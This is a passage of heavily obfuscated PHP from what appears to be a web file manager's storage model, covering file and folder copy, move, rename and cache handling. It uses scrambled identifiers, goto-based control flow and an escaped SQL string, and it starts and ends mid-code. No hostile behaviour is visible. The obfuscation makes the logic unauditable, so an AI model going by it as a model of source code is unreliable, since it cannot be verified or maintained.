$fŸî÷²Ïí™[$AˆÇÆ²“§¤[428]], $fŸî÷²Ïí™[$AˆÇÆ²“§¤[87]]); if ($e·™åÅ¤ˆí) { $Dô§‚È††[$AˆÇÆ²“§¤[512]][] = $fŸî÷²Ïí™[$AˆÇÆ²“§¤[428]]; } } else { if ($fêÅÆ¾×² == REPEAT_SKIP) { } } } Hook::trigger($AˆÇÆ²“§¤[517], array($AˆÇÆ²“§¤[518], $fŸî÷²Ïí™, 0)); } goto d¹™ùö£„¶; B—“ÑÑØ¼è: $A§ôÃà®ß = $EÓô•Æé¸õ ? $EÓô•Æé¸õ : $fŸî÷²Ïí™[$AˆÇÆ²“§¤[38]]; $f‹ïš´îÎ… = $this->fileNameExistCache($fÛêí¨ø‘Š, $A§ôÃà®ß); if ($Eƒ”êß¢) { $this->_childrenAllMake($C¹¸‚ë¸»Î); if ($bê•Ì¾ôçÜ && $f‹ïš´îÎ…) { $this->_childrenAllMake($f‹ïš´îÎ…); } } goto f“´õ“Àõ‰; eÑÖ™Ó‰: $AˆÇÆ²“§¤ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $fŸî÷²Ïí™ = $this->sourceInfoCache($C¹¸‚ë¸»Î); $bê•Ì¾ôçÜ = $fŸî÷²Ïí™[$AˆÇÆ²“§¤[379]] == $AˆÇÆ²“§¤[93]; goto B—“ÑÑØ¼è; e›«ÇÍÈêã: } private function _copyCreate($BÒÍºòíÈ±, $fô¥î·Î†, $DÊö•·ìƒù, &$d’š³¡´×Ã) { goto aª¹Ûáç½Â; aª¹Ûáç½Â: $FÙã¥’–…’ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $a¨‹˜“‰æµ = $this->sourceInfoCache($BÒÍºòíÈ±); $C²È…òÎªæ = $this->sourceInfoCache($fô¥î·Î†); goto a‡ë·™® £; B‰ª³„ãŞ«: $this->chunkEventSet($FÙã¥’–…’[526], array($FÙã¥’–…’[527], $F““’µ¾ƒ„, $AŸ•ºãÕÏ)); $this->saveAll($d²âË½“ˆ½); return $BŸ©Šƒù¤; goto AñÛùÖ¼ô‹; a‡ë·™® £: $F““’µ¾ƒ„ = $this->_makeItemData($a¨‹˜“‰æµ, $C²È…òÎªæ, $DÊö•·ìƒù); Hook::trigger($FÙã¥’–…’[519], $F““’µ¾ƒ„); Hook::trigger($FÙã¥’–…’[520], array($FÙã¥’–…’[521], $F““’µ¾ƒ„, 0)); goto c˜¢Çöß“á; B²¿¤Ô°Ã: $this->_childrenListAll($BÒÍºòíÈ±, $F¾è¢Ö’˜); $AŸ•ºãÕÏ = count($F¾è¢Ö’˜); if ($AŸ•ºãÕÏ == 0) { return $BŸ©Šƒù¤; } goto f÷³Ò‰‰ÅŞ; cŠí‰…ù‰: if ($a¨‹˜“‰æµ[$FÙã¥’–…’[379]] != $FÙã¥’–…’[93]) { $d’š³¡´×Ã[$FÙã¥’–…’[512]][] = $a¨‹˜“‰æµ[$FÙã¥’–…’[428]]; return $BŸ©Šƒù¤; } $F¾è¢Ö’˜ = array(); $Föß´åÇ = array(); goto B²¿¤Ô°Ã; f÷³Ò‰‰ÅŞ: $aĞôĞ«… = $this->sourceInfo($BŸ©Šƒù¤); foreach ($F¾è¢Ö’˜ as $D´Û²®ƒç¨) { $Cùá‡Ï–öè = $this->_makeItemData($D´Û²®ƒç¨, $aĞôĞ«…, $D´Û²®ƒç¨[$FÙã¥’–…’[38]]); $Cùá‡Ï–öè[$FÙã¥’–…’[470]] = $D´Û²®ƒç¨[$FÙã¥’–…’[470]]; $Föß´åÇ[] = $Cùá‡Ï–öè; } $this->chunkEventSet($FÙã¥’–…’[522], array($FÙã¥’–…’[523], $F““’µ¾ƒ„, $AŸ•ºãÕÏ)); goto fêŒ‚²ïƒ¬; EÛóÖöŞñ: foreach ($f§îº¡×Õ° as $D´Û²®ƒç¨) { $D°¨Ä—ãù¼ = $D´Û²®ƒç¨[$FÙã¥’–…’[378]]; $B°¼¶öó‡“ = $this->_childrenMatch($d·ÀóôÓ½, $D´Û²®ƒç¨, $aĞôĞ«…); $B ¯ÜÁŒ˜Î[] = array($FÙã¥’–…’[378], $D°¨Ä—ãù¼, $FÙã¥’–…’[472], $B°¼¶öó‡“[$FÙã¥’–…’[472]]); $d²âË½“ˆ½[] = array($FÙã¥’–…’[378], $D°¨Ä—ãù¼, $FÙã¥’–…’[470], $B°¼¶öó‡“[$FÙã¥’–…’[470]]); $this->_copyApplyMeta($D´Û²®ƒç¨, $d’š³¡´×Ã); if ($D´Û²®ƒç¨[$FÙã¥’–…’[379]] != $FÙã¥’–…’[93]) { $d’š³¡´×Ã[$FÙã¥’–…’[512]][] = $D´Û²®ƒç¨[$FÙã¥’–…’[428]]; } } $this->chunkEventSet($FÙã¥’–…’[524], array($FÙã¥’–…’[525], $F““’µ¾ƒ„, $AŸ•ºãÕÏ)); $this->saveAll($B ¯ÜÁŒ˜Î); goto B‰ª³„ãŞ«; c˜¢Çöß“á: $BŸ©Šƒù¤ = $this->add($F““’µ¾ƒ„); $DÎò¬àŞ© = array($FÙã¥’–…’[378] => $BŸ©Šƒù¤, $FÙã¥’–…’[38] => $DÊö•·ìƒù); $this->_copyApplyMeta($DÎò¬àŞ©, $d’š³¡´×Ã); goto cŠí‰…ù‰; fêŒ‚²ïƒ¬: $this->addAll($Föß´åÇ, array(), !1); $f§îº¡×Õ° = $this->where(array($FÙã¥’–…’[472] => $BŸ©Šƒù¤))->select(); $d·ÀóôÓ½ = $this->_childrenMakeRelation($F¾è¢Ö’˜, $f§îº¡×Õ°); goto e¼–»ÈË­­; e¼–»ÈË­­: $d·ÀóôÓ½[$BÒÍºòíÈ±] = $BŸ©Šƒù¤; $B ¯ÜÁŒ˜Î = array(); $d²âË½“ˆ½ = array(); goto EÛóÖöŞñ; AñÛùÖ¼ô‹: } private function _childrenMakeRelation($D‘—²à×ˆ, $d‰±–ÔÚÜµ) { $Eïö³İÒíæ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $bªäĞæñí = array(); $BÆ‚’é¬Ù‰ = array(); foreach ($D‘—²à×ˆ as $føœóÏÓ™„) { $aßÔÔ‘«Ñ = $føœóÏÓ™„[$Eïö³İÒíæ[38]] . $Eïö³İÒíæ[18] . $føœóÏÓ™„[$Eïö³İÒíæ[470]]; $bªäĞæñí[$aßÔÔ‘«Ñ] = $føœóÏÓ™„[$Eïö³İÒíæ[378]]; } foreach ($d‰±–ÔÚÜµ as $føœóÏÓ™„) { $aßÔÔ‘«Ñ = $føœóÏÓ™„[$Eïö³İÒíæ[38]] . $Eïö³İÒíæ[18] . $føœóÏÓ™„[$Eïö³İÒíæ[470]]; $aîáÓ©¢Ô¸ = $bªäĞæñí[$aßÔÔ‘«Ñ]; $BÆ‚’é¬Ù‰[$aîáÓ©¢Ô¸] = $føœóÏÓ™„[$Eïö³İÒíæ[378]]; } return $BÆ‚’é¬Ù‰; } private function _childrenMatch($cóš¦©·Üô, $B¾µ£ğ¬î¡, $bğÛÎÒÄâé) { goto CÍêƒõ©‹; CÍêƒõ©‹: $A¾ˆ¸°ÇØÍ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $fØ‡İ¾éÜ­ = $bğÛÎÒÄâé[$A¾ˆ¸°ÇØÍ[470]]; $F´¤ÙÍÑù² = $this->parentLevelArray($B¾µ£ğ¬î¡[$A¾ˆ¸°ÇØÍ[470]]); goto A²ÓÍ Ú‚Ø; A²ÓÍ Ú‚Ø: foreach ($F´¤ÙÍÑù² as $BôŠùğó¹â) { if (isset($cóš¦©·Üô[$BôŠùğó¹â])) { $fØ‡İ¾éÜ­ .= $cóš¦©·Üô[$BôŠùğó¹â] . $A¾ˆ¸°ÇØÍ[528]; } } $fØ‡İ¾éÜ­ = rtrim($fØ‡İ¾éÜ­, $A¾ˆ¸°ÇØÍ[57]) . $A¾ˆ¸°ÇØÍ[57]; $CÍ­Š†èí = $this->parentLevelArray($fØ‡İ¾éÜ­); goto f»İ“†¥ì; f»İ“†¥ì: $bº§µœ¨Çë = $CÍ­Š†èí[count($CÍ­Š†èí) - 1]; return array($A¾ˆ¸°ÇØÍ[472] => $bº§µœ¨Çë, $A¾ˆ¸°ÇØÍ[470] => $fØ‡İ¾éÜ­); goto Aø±Š¾éŞ†; Aø±Š¾éŞ†: } private function _makeItemData($c·äŒ¹êì, $f¤È±Şê×è, $C¸Ë÷ˆŞ³½) { $Báçè¤‹Åõ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $fåßˆ¡¡¶Ş = array($Báçè¤‹Åõ[529] => $c·äŒ¹êì[$Báçè¤‹Åõ[379]], $Báçè¤‹Åõ[395] => $C¸Ë÷ˆŞ³½, $Báçè¤‹Åõ[530] => $c·äŒ¹êì[$Báçè¤‹Åõ[381]], $Báçè¤‹Åõ[429] => $c·äŒ¹êì[$Báçè¤‹Åõ[428]], $Báçè¤‹Åõ[531] => $c·äŒ¹êì[$Báçè¤‹Åõ[87]], $Báçè¤‹Åõ[532] => $f¤È±Şê×è[$Báçè¤‹Åõ[380]], $Báçè¤‹Åõ[533] => $f¤È±Şê×è[$Báçè¤‹Åõ[467]], $Báçè¤‹Åõ[534] => USER_ID, $Báçè¤‹Åõ[535] => USER_ID, $Báçè¤‹Åõ[377] => $f¤È±Şê×è[$Báçè¤‹Åõ[378]], $Báçè¤‹Åõ[536] => $f¤È±Şê×è[$Báçè¤‹Åõ[470]] . $f¤È±Şê×è[$Báçè¤‹Åõ[378]] . $Báçè¤‹Åõ[57], $Báçè¤‹Åõ[405] => 0, $Báçè¤‹Åõ[537] => $Báçè¤‹Åõ[43]); return $fåßˆ¡¡¶Ş; } private function _copyApplyMeta($aÇ’“í£ÕŒ, &$E¦©í¬¹›) { $aÈ³âŒÃê› =& $_SERVER[çŞáÓæÚô‚Ô‡]; $fó”ÎÛè£ª = $aÇ’“í£ÕŒ[$aÈ³âŒÃê›[378]]; $Cùˆ˜œŸ¬Á = $aÇ’“í£ÕŒ[$aÈ³âŒÃê›[38]]; if (!isset($aÇ’“í£ÕŒ[$aÈ³âŒÃê›[538]]) || !$aÇ’“í£ÕŒ[$aÈ³âŒÃê›[538]] || $aÇ’“í£ÕŒ[$aÈ³âŒÃê›[538]] == $aÈ³âŒÃê›[479]) { $E¦©í¬¹›[$aÈ³âŒÃê›[514]][] = array($aÈ³âŒÃê›[378], $fó”ÎÛè£ª, $aÈ³âŒÃê›[538], short_id($fó”ÎÛè£ª)); } if (Input::check($Cùˆ˜œŸ¬Á, $aÈ³âŒÃê›[539])) { $E¦©í¬¹›[$aÈ³âŒÃê›[513]][] = array($aÈ³âŒÃê›[378] => $fó”ÎÛè£ª, $aÈ³âŒÃê›[99] => $aÈ³âŒÃê›[425], $aÈ³âŒÃê›[368] => str_replace($aÈ³âŒÃê›[60], $aÈ³âŒÃê›[43], Pinyin::encode($Cùˆ˜œŸ¬Á))); $E¦©í¬¹›[$aÈ³âŒÃê›[513]][] = array($aÈ³âŒÃê›[378] => $fó”ÎÛè£ª, $aÈ³âŒÃê›[99] => $aÈ³âŒÃê›[424], $aÈ³âŒÃê›[368] => Pinyin::encode($Cùˆ˜œŸ¬Á, $aÈ³âŒÃê›[540])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($a‹ÖôŠº¬) { goto DŠøº…Œ„™; aÀËŠ™‰š: $Eğ‰â×š—Š = array($F÷¸à¯ôÄ­[470] => array($F÷¸à¯ôÄ­[494], $a¢Ú§İñ¬[$F÷¸à¯ôÄ­[470]] . $a‹ÖôŠº¬ . $F÷¸à¯ôÄ­[495]), $F÷¸à¯ôÄ­[406] => $this->targetIsDelete); $C¨©Ì­âùŞ = $this->field($CªŒËçØË)->where($Eğ‰â×š—Š)->select(); if (!$C¨©Ì­âùŞ) { return; } goto DîŸí¿Øˆ; DîŸí¿Øˆ: $C¨©Ì­âùŞ = array_to_keyvalue($C¨©Ì­âùŞ, $F÷¸à¯ôÄ­[378]); foreach ($C¨©Ì­âùŞ as $FÕ½‡Ÿƒ÷) { $dÛƒ™œÔÑ¬ = $FÕ½‡Ÿƒ÷[$F÷¸à¯ôÄ­[472]]; $a‹ÖôŠº¬ = $FÕ½‡Ÿƒ÷[$F÷¸à¯ôÄ­[378]]; if (!isset($this->_childrenListCache[$a‹ÖôŠº¬]) && $FÕ½‡Ÿƒ÷[$F÷¸à¯ôÄ­[379]] == $F÷¸à¯ôÄ­[93]) { $this->_childrenListCache[$a‹ÖôŠº¬] = array(); } if (!isset($this->_childrenListCache[$dÛƒ™œÔÑ¬])) { $this->_childrenListCache[$dÛƒ™œÔÑ¬] = array(); } $this->_childrenListCache[$dÛƒ™œÔÑ¬][$a‹ÖôŠº¬] = $FÕ½‡Ÿƒ÷; $this->_childrenItemCache[$a‹ÖôŠº¬] = $FÕ½‡Ÿƒ÷; } goto eÑ°Œ¶Ò×Ò; DŠøº…Œ„™: $F÷¸à¯ôÄ­ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $a¢Ú§İñ¬ = $this->sourceInfo($a‹ÖôŠº¬); $CªŒËçØË = $F÷¸à¯ôÄ­[541]; goto aÀËŠ™‰š; eÑ°Œ¶Ò×Ò: } private function _childrenListAll($F’Üœ¸áµé, &$CÙÔµ«ŸÀ) { $EÍ©Ñ’šÛ… =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!isset($this->_childrenListCache[$F’Üœ¸áµé])) { return; } $a‚æŞ÷Á”â = $this->_childrenListCache[$F’Üœ¸áµé]; foreach ($a‚æŞ÷Á”â as $Dá‰Ô…ÔŒ¦ => $Cø‰³‡Í‡) { $CÙÔµ«ŸÀ[$Dá‰Ô…ÔŒ¦] = $Cø‰³‡Í‡; if ($Cø‰³‡Í‡[$EÍ©Ñ’šÛ…[379]] == $EÍ©Ñ’šÛ…[93]) { $this->_childrenListAll($Dá‰Ô…ÔŒ¦, $CÙÔµ«ŸÀ); } } } private function sourceInfoCache($d‘¥œ‡£Ê³) { if (isset($this->_childrenItemCache[$d‘¥œ‡£Ê³])) { return $this->_childrenItemCache[$d‘¥œ‡£Ê³]; } return $this->sourceInfo($d‘¥œ‡£Ê³); } private function _childrenList($eÅ·ŒÑ‰½—) { if (isset($this->_childrenListCache[$eÅ·ŒÑ‰½—])) { return $this->_childrenListCache[$eÅ·ŒÑ‰½—]; } return $this->_childrenListSelect($eÅ·ŒÑ‰½—); } private function _childrenListSelect($A”‰Û¶ãŞ¤) { goto ešÙÏ¶µé¿; B‹± ïƒà: foreach ($eŒ¼±Œ‡†¾ as $A”‰Û¶ãŞ¤ => $e£Á‘ Ù»Ğ) { $this->_childrenItemCache[$A”‰Û¶ãŞ¤] = $e£Á‘ Ù»Ğ; } return $eŒ¼±Œ‡†¾; goto e–°ÀïŞãç; C¿‹™Ä´±»: $A°ø÷†™‚Š = $A°ø÷†™‚Š ? $A°ø÷†™‚Š : array(); $eŒ¼±Œ‡†¾ = array_to_keyvalue($A°ø÷†™‚Š, $B…ˆèŞ©øß[378]); $this->_childrenListCache[$A”‰Û¶ãŞ¤] = $eŒ¼±Œ‡†¾; goto B‹± ïƒà; ešÙÏ¶µé¿: $B…ˆèŞ©øß =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Cåíä‰­Åø = array($B…ˆèŞ©øß[472] => $A”‰Û¶ãŞ¤, $B…ˆèŞ©øß[406] => $this->targetIsDelete); $A°ø÷†™‚Š = $this->where($Cåíä‰­Åø)->select(); goto C¿‹™Ä´±»; e–°ÀïŞãç: } private function fileNameExistCache($eå“×â˜, $Eç•­àÓ) { $C‚ì¦¼ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Eç•­àÓ = strtolower($Eç•­àÓ); $FàÔÑ¶–Ò± = $this->_childrenList($eå“×â˜); foreach ($FàÔÑ¶–Ò± as $F¤Œ»Óä»Ç) { if ($Eç•­àÓ == strtolower($F¤Œ»Óä»Ç[$C‚ì¦¼[38]])) { return $F¤Œ»Óä»Ç[$C‚ì¦¼[378]]; } } return !1; } private function fileNameAutoCache($dòƒ¾îë®, $c´ÆğçŠ‘, $B…ëîÍ¾ò , $c˜„¾¸š„Õ) { $a«…»ç…ì =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Eà´÷áõ†¢ = $this->_childrenList($dòƒ¾îë®); $aØ¥‚‰ • = array_to_keyvalue($Eà´÷áõ†¢, $a«…»ç…ì[43], $a«…»ç…ì[38]); return $this->fileNameAutoGet($aØ¥‚‰ •, $c´ÆğçŠ‘, $B…ëîÍ¾ò , $c˜„¾¸š„Õ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($a™¬Øá¡Å…, $eóÒÙ†İä¼, $D½šÆ“Á°Å = REPEAT_REPLACE, $AÇÉçµù¼ = '') { goto bè°¯³İª; bè°¯³İª: $eÅù¥ç‘Å… =& $_SERVER[çŞáÓæÚô‚Ô‡]; $E„ŠÂÕ‡Æ‚ = $this->sourceInfo($a™¬Øá¡Å…); $BŒ„—ß”»¨ = $this->sourceInfo($eóÒÙ†İä¼); goto B÷¸šÑ¿öù; C®±Êéº¡‘: $e—ÛŸˆÂ‹² = $this->fileNameExistCache($eóÒÙ†İä¼, $E„ŠÂÕ‡Æ‚[$eÅù¥ç‘Å…[38]]); $F½¯­ôØ©Œ = $this->_move($a™¬Øá¡Å…, $eóÒÙ†İä¼, $D½šÆ“Á°Å, $BºÄÓó–†Œ, $AÇÉçµù¼); $this->sourceCacheClear(); goto A¡åÄÚ; A¯‘‡‚•òÉ: $this->lockWriteStart($eóÒÙ†İä¼, $F×öÚ“Ÿå›); $BºÄÓó–†Œ = array($eÅù¥ç‘Å…[512] => array(), $eÅù¥ç‘Å…[544] => !1); $this->clearShare($a™¬Øá¡Å…, $eóÒÙ†İä¼); goto C®±Êéº¡‘; B÷¸šÑ¿öù: if ($E„ŠÂÕ‡Æ‚[$eÅù¥ç‘Å…[472]] == $BŒ„—ß”»¨[$eÅù¥ç‘Å…[378]]) { if ($E„ŠÂÕ‡Æ‚[$eÅù¥ç‘Å…[406]] == $eÅù¥ç‘Å…[93]) { Model($eÅù¥ç‘Å…[404])->restore(array($a™¬Øá¡Å…)); } return $a™¬Øá¡Å…; } $cÚã Ú›… = $this->pathInfoMore($a™¬Øá¡Å…); if ($this->isParentOf($a™¬Øá¡Å…, $eóÒÙ†İä¼)) { return !1; } goto FÅó¼š‚›º; A¡åÄÚ: if ($E„ŠÂÕ‡Æ‚[$eÅù¥ç‘Å…[379]] == $eÅù¥ç‘Å…[93] && $e—ÛŸˆÂ‹²) { $this->folderSizeResetChildren($F½¯­ôØ©Œ); } Model($eÅù¥ç‘Å…[177])->linkAdd($BºÄÓó–†Œ[$eÅù¥ç‘Å…[512]]); if ($e—ÛŸˆÂ‹² && $BºÄÓó–†Œ[$eÅù¥ç‘Å…[544]]) { $this->removeNow($a™¬Øá¡Å…, !1); } goto Cã«ŒÉƒóŸ; F²ñ¿¬Š©â: $this->folderSizeReset($eóÒÙ†İä¼); $fë†–ˆ¤ó = array($E„ŠÂÕ‡Æ‚[$eÅù¥ç‘Å…[472]], $eóÒÙ†İä¼); if ($E„ŠÂÕ‡Æ‚[$eÅù¥ç‘Å…[379]] == $eÅù¥ç‘Å…[93]) { $fë†–ˆ¤ó[] = $a™¬Øá¡Å…; } goto FÀ¢¡™£«¦; FÅó¼š‚›º: if (!$E„ŠÂÕ‡Æ‚ || !$BŒ„—ß”»¨ || $BŒ„—ß”»¨[$eÅù¥ç‘Å…[379]] != $eÅù¥ç‘Å…[93]) { return !1; } Hook::trigger($eÅù¥ç‘Å…[542], $cÚã Ú›…); $this->targetIsDelete = intval($E„ŠÂÕ‡Æ‚[$eÅù¥ç‘Å…[406]]); goto fÛÚªÀÒ­; FÀ¢¡™£«¦: $this->updateModifyTime($fë†–ˆ¤ó); Model($eÅù¥ç‘Å…[516])->eventMove($a™¬Øá¡Å…, $E„ŠÂÕ‡Æ‚[$eÅù¥ç‘Å…[472]], $eóÒÙ†İä¼); Hook::trigger($eÅù¥ç‘Å…[543], $cÚã Ú›…); goto cˆïò¡‰È‰; Cã«ŒÉƒóŸ: $this->lockMoveEnd($a™¬Øá¡Å…); $this->lockWriteEnd($eóÒÙ†İä¼, $F×öÚ“Ÿå›); $this->folderSizeReset($E„ŠÂÕ‡Æ‚[$eÅù¥ç‘Å…[472]]); goto F²ñ¿¬Š©â; fÛÚªÀÒ­: if ($E„ŠÂÕ‡Æ‚[$eÅù¥ç‘Å…[472]] == $eóÒÙ†İä¼ && $AÇÉçµù¼ != $E„ŠÂÕ‡Æ‚[$eÅù¥ç‘Å…[38]]) { $D‘‹”ó«×Ú = $this->fileNameExist($eóÒÙ†İä¼, $AÇÉçµù¼); if ($D‘‹”ó«×Ú && $E„ŠÂÕ‡Æ‚[$eÅù¥ç‘Å…[379]] == $eÅù¥ç‘Å…[479]) { goto bÆñ‰²‹´¹; Cƒ°Ü¦´›¶: $this->removeNow($a™¬Øá¡Å…, !1); $this->folderSizeReset($eóÒÙ†İä¼); Hook::trigger($eÅù¥ç‘Å…[543], $cÚã Ú›…); goto d«”¬ô±ÔÊ; bÆñ‰²‹´¹: $C¥ò­âŠÙƒ = $this->sourceInfo($D‘‹”ó«×Ú); $b£ê‘²¡©« = $this->fileHistory($C¥ò­âŠÙƒ, $E„ŠÂÕ‡Æ‚[$eÅù¥ç‘Å…[428]], $E„ŠÂÕ‡Æ‚[$eÅù¥ç‘Å…[87]]); if (!$b£ê‘²¡©«) { Model($eÅù¥ç‘Å…[431])->remove($E„ŠÂÕ‡Æ‚[$eÅù¥ç‘Å…[428]]); } goto Cƒ°Ü¦´›¶; d«”¬ô±ÔÊ: return $D‘‹”ó«×Ú; goto AÇ¹è’›ší; AÇ¹è’›ší: } } $F×öÚ“Ÿå› = $AÇÉçµù¼ ? $AÇÉçµù¼ : $E„ŠÂÕ‡Æ‚[$eÅù¥ç‘Å…[38]]; $this->lockMoveStart($a™¬Øá¡Å…); goto A¯‘‡‚•òÉ; cˆïò¡‰È‰: return $F½¯­ôØ©Œ; goto EäÑ„…èÊ; EäÑ„…èÊ: } private function _move($cßˆŠˆ†, $d¹ãš‘ĞóÈ, $dáŒìË ëø, &$BÔïñÒŒÙ, $dØ‹´Íçîñ = '') { goto dè‘††¦ÂÏ; EËá‹†ÑÚÕ: return $cËŠò‡°ÛÔ; goto A›Çêƒ»; D‹èÕÃµÁ: $E¶ õä”•à = $dØ‹´Íçîñ ? $dØ‹´Íçîñ : $F–£†å¬ÅŞ[$CÕÑªµİÁÖ[38]]; $Cîöè§£¤« = $this->fileNameExistCache($d¹ãš‘ĞóÈ, $E¶ õä”•à); $this->lockMoveStart($cßˆŠˆ†); goto d÷¥àÕÅ ë; d÷¥àÕÅ ë: $this->lockWriteStart($d¹ãš‘ĞóÈ, $E¶ õä”•à); if (!$Cîöè§£¤«) { return $this->_moveForce($cßˆŠˆ†, $d¹ãš‘ĞóÈ, $E¶ õä”•à); } $cËŠò‡°ÛÔ = $Cîöè§£¤«; goto fî¹¬ôµ¨—; fî¹¬ôµ¨—: $cìÜà‘¼¨ï = !1; if ($BìÜ¨êòĞŠ) { if ($dáŒìË ëø == REPEAT_RENAME_FOLDER) { $E¶ õä”•à = $this->fileNameAuto($d¹ãš‘ĞóÈ, $E¶ õä”•à, $dáŒìË ëø, $BìÜ¨êòĞŠ); $cËŠò‡°ÛÔ = $this->_moveForce($cßˆŠˆ†, $d¹ãš‘ĞóÈ, $E¶ õä”•à); } else { if ($dáŒìË ëø == REPEAT_RENAME_FOLDER) { $dáŒìË ëø = REPEAT_RENAME; } $aåíÁì‹Ğ = $this->_childrenListSelect($cßˆŠˆ†); foreach ($aåíÁì‹Ğ as $bÆ¡É¨°íö) { $this->_move($bÆ¡É¨°íö[$CÕÑªµİÁÖ[378]], $Cîöè§£¤«, $dáŒìË ëø, $BÔïñÒŒÙ); } $cìÜà‘¼¨ï = !0; } } else { if ($dáŒìË ëø == REPEAT_SKIP) { $cìÜà‘¼¨ï = !0; } else { if ($dáŒìË ëø == REPEAT_RENAME || $dáŒìË ëø == REPEAT_RENAME_FOLDER) { $E¶ õä”•à = $this->fileNameAuto($d¹ãš‘ĞóÈ, $E¶ õä”•à, $dáŒìË ëø, $BìÜ¨êòĞŠ); $cËŠò‡°ÛÔ = $this->_moveForce($cßˆŠˆ†, $d¹ãš‘ĞóÈ, $E¶ õä”•à); } else { if ($dáŒìË ëø == REPEAT_REPLACE) { $EÌÈ›Ï©á = $this->sourceInfoCache($Cîöè§£¤«); $CÏ„«ŠØ¶¨ = $this->fileHistory($EÌÈ›Ï©á, $F–£†å¬ÅŞ[$CÕÑªµİÁÖ[428]], $F–£†å¬ÅŞ[$CÕÑªµİÁÖ[87]]); if ($CÏ„«ŠØ¶¨) { $BÔïñÒŒÙ[$CÕÑªµİÁÖ[512]][] = $F–£†å¬ÅŞ[$CÕÑªµİÁÖ[428]]; } else { $cìÜà‘¼¨ï = !0; } } } } } if ($cìÜà‘¼¨ï && !$BÔïñÒŒÙ[$CÕÑªµİÁÖ[544]]) { $BÔïñÒŒÙ[$CÕÑªµİÁÖ[544]] = !0; } goto EËá‹†ÑÚÕ; dè‘††¦ÂÏ: $CÕÑªµİÁÖ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $F–£†å¬ÅŞ = $this->sourceInfo($cßˆŠˆ†); $BìÜ¨êòĞŠ = $F–£†å¬ÅŞ[$CÕÑªµİÁÖ[379]] == $CÕÑªµİÁÖ[93]; goto D‹èÕÃµÁ; A›Çêƒ»: } private function _moveForce($c…ÙšÅÄ§, $dó£±âœ‘Ó, $F”ÚõÌ³Õ) { goto câ‹Œ¤³¹¡; b˜Â–Ì‡ù¢: if (!$AÛ¯îÒïÒ˜) { Model($Cë‘İñÈ«—[465])->authClear($c…ÙšÅÄ§); } $A¼ÄŒ£ˆÛ = $a³Õ‹ÓòË[$Cë‘İñÈ«—[406]] == $Cë‘İñÈ«—[93] && $DÔĞ‚¤Î›[$Cë‘İñÈ«—[406]] != $Cë‘İñÈ«—[93]; if ($A¼ÄŒ£ˆÛ) { $A£¬¼Ê â[$Cë‘İñÈ«—[405]] = 0; } goto B¶¾ò·ã¤Ç; Dïˆëˆİİ : $Eèã¦ƒæïã = $a³Õ‹ÓòË[$Cë‘İñÈ«—[379]] == $Cë‘İñÈ«—[93]; $A£¬¼Ê â = array($Cë‘İñÈ«—[377] => $DÔĞ‚¤Î›[$Cë‘İñÈ«—[378]], $Cë‘İñÈ«—[536] => $DÔĞ‚¤Î›[$Cë‘İñÈ«—[470]] . $DÔĞ‚¤Î›[$Cë‘İñÈ«—[378]] . $Cë‘İñÈ«—[57], $Cë‘İñÈ«—[532] => $DÔĞ‚¤Î›[$Cë‘İñÈ«—[380]], $Cë‘İñÈ«—[533] => $DÔĞ‚¤Î›[$Cë‘İñÈ«—[467]], $Cë‘İñÈ«—[535] => USER_ID, $Cë‘İñÈ«—[395] => $F”ÚõÌ³Õ); $AÛ¯îÒïÒ˜ = $a³Õ‹ÓòË[$Cë‘İñÈ«—[380]] == SourceModel::TYPE_GROUP && $DÔĞ‚¤Î›[$Cë‘İñÈ«—[380]] == SourceModel::TYPE_GROUP && $a³Õ‹ÓòË[$Cë‘İñÈ«—[467]] == $DÔĞ‚¤Î›[$Cë‘İñÈ«—[467]]; goto b˜Â–Ì‡ù¢; B¶¾ò·ã¤Ç: if ($Eèã¦ƒæïã) { $D²¡ô¸¥¯à = array($Cë‘İñÈ«—[536] => array($Cë‘İñÈ«—[494], $a³Õ‹ÓòË[$Cë‘İñÈ«—[470]] . $a³Õ‹ÓòË[$Cë‘İñÈ«—[378]] . $Cë‘İñÈ«—[495])); $Aù›æÌ×öÖ = $a³Õ‹ÓòË[$Cë‘İñÈ«—[470]] . $a³Õ‹ÓòË[$Cë‘İñÈ«—[378]] . $Cë‘İñÈ«—[57]; $D˜ÊÉÎå = $DÔĞ‚¤Î›[$Cë‘İñÈ«—[470]] . $DÔĞ‚¤Î›[$Cë‘İñÈ«—[378]] . $Cë‘İñÈ«—[57] . $a³Õ‹ÓòË[$Cë‘İñÈ«—[378]] . $Cë‘İñÈ«—[57]; $B˜‡œÛ°çß = array($Cë‘İñÈ«—[536] => array($Cë‘İñÈ«—[545], "\162\x65\160\154\141\143\x65\50\x70\x61\x72\145\156\x74\114\x65\x76\145\x6c\x2c\47{$Aù›æÌ×öÖ}\47\54\x27{$D˜ÊÉÎå}\47\x29"), $Cë‘İñÈ«—[532] => $DÔĞ‚¤Î›[$Cë‘İñÈ«—[380]], $Cë‘İñÈ«—[533] => $DÔĞ‚¤Î›[$Cë‘İñÈ«—[467]]); if ($A¼ÄŒ£ˆÛ) { $B˜‡œÛ°çß[$Cë‘İñÈ«—[405]] = 0; } $this->where($D²¡ô¸¥¯à)->data($B˜‡œÛ°çß)->save(); } $this->where(array($Cë‘İñÈ«—[392] => $c…ÙšÅÄ§))->data($A£¬¼Ê â)->save(); return $c…ÙšÅÄ§; goto fß™«ÈÓ·÷; câ‹Œ¤³¹¡: $Cë‘İñÈ«— =& $_SERVER[çŞáÓæÚô‚Ô‡]; $a³Õ‹ÓòË = $this->sourceInfo($c…ÙšÅÄ§); $DÔĞ‚¤Î› = $this->sourceInfo($dó£±âœ‘Ó); goto Dïˆëˆİİ ; fß™«ÈÓ·÷: } private function clearShare($f…êÄÀ ‡, $B¾Ÿ˜à‹­) { goto fæè¡Ïç¶; E’ÙÇäœôÚ: if (!$C³”Å’ƒ) { return; } $BÉ¬‰Ä²­« = array($E§¸°˜òŠ[378] => array($E§¸°˜òŠ[17], $C³”Å’ƒ), $E§¸°˜òŠ[457] => 